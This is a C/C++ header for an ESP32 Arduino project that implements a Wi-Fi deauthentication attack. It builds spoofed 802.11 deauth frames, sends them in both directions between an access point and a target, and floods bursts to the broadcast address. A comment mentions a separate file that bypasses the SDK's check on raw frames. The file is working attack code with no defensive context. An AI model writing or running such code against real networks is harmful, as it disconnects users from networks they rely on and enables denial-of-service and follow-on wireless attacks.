/*
 * wifi_attack.h — Deauthentication attack module
 * Sends 802.11 deauth frames via esp_wifi_80211_tx
 */
#pragma once

#include "esp_wifi.h"
#include "wifi_scan.h"
#include <Arduino.h>

// ── Deauth frame template ──────────────────────
// IEEE 802.11 Deauthentication frame (26 bytes)
static uint8_t deauthPacket[26] = {
    0xC0, 0x00,                         // Frame Control: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast or target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence number
    0x01, 0x00                          // Reason: Unspecified (1)
};

// Deauth stats
struct DeauthStats {
  uint32_t packetsSent;
  uint32_t packetsTotal;
  bool running;
  unsigned long startTime;
};

extern DeauthStats deauthStats;

// ── Bypass for raw frame check ─────────────────
// Defined in src/wifi_bypass.c — overrides internal SDK check
// to allow deauth management frames via esp_wifi_80211_tx.

// ── Send single deauth frame ──────────────────
inline bool sendDeauthFrame(const uint8_t *bssid, const uint8_t *target,
                            uint8_t channel, uint8_t reason = 1) {
  // Set channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Build frame: AP → Target (deauth from AP)
  memcpy(&deauthPacket[4], target, 6); // Destination
  memcpy(&deauthPacket[10], bssid, 6); // Source (AP)
  memcpy(&deauthPacket[16], bssid, 6); // BSSID
  deauthPacket[24] = reason;

  // Send AP → Target
  esp_err_t r1 =
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);

  // Also send Target → AP (reverse direction for completeness)
  memcpy(&deauthPacket[4], bssid, 6);   // Destination (AP)
  memcpy(&deauthPacket[10], target, 6); // Source (Target)
  memcpy(&deauthPacket[16], bssid, 6);  // BSSID

  esp_err_t r2 =
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);

  return (r1 == ESP_OK || r2 == ESP_OK);
}

// Broadcast destination for flood
static const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// ── Deauth flood (burst of N packets) ─────────
inline uint32_t deauthBurst(const uint8_t *bssid, uint8_t channel,
                            int count = 10,
                            const uint8_t *targetMac = nullptr) {
  const uint8_t *target = (targetMac != nullptr) ? targetMac : BROADCAST_MAC;
  uint32_t sent = 0;

  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true); // needed for raw TX
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  for (int i = 0; i < count; i++) {
    if (sendDeauthFrame(bssid, target, channel)) {
      sent++;
    }
    delayMicroseconds(500); // Small delay between frames
  }

  return sent;
}
